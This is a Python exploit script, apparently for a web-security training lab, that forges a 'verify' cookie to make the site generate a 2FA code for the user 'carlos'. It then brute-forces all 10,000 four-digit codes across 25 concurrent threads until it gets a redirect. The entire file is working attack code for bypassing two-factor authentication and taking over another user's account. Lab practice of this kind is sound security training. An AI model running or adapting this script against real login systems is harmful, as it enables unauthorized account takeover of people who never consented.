import requests
import threading
from concurrent.futures import ThreadPoolExecutor

LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net"
SESSION_COOKIE = "YOUR_SESSION_COOKIE_HERE"  # your own session, after reaching the 2FA page

found = threading.Event()
result = {}

def generate_code_for_carlos():
    requests.get(f"{LAB_URL}/login2", cookies={"session": SESSION_COOKIE, "verify": "carlos"})
    print("[+] 2FA code generated for carlos")

def try_code(code):
    if found.is_set():
        return
    mfa_code = f"{code:04d}"
    r = requests.post(f"{LAB_URL}/login2",
                       cookies={"session": SESSION_COOKIE, "verify": "carlos"},
                       data={"mfa-code": mfa_code},
                       allow_redirects=False)
    if r.status_code == 302:
        found.set()
        result["code"] = mfa_code
        print(f"\n[\u2713] Valid code found: {mfa_code}")

def brute_force():
    print("[+] Starting concurrent brute-force...")
    with ThreadPoolExecutor(max_workers=25) as pool:
        pool.map(try_code, range(10000))
    print(f"[\u2713] mfa-code={result['code']}" if "code" in result else "[-] Not found")

if __name__ == "__main__":
    generate_code_for_carlos()
    brute_force()
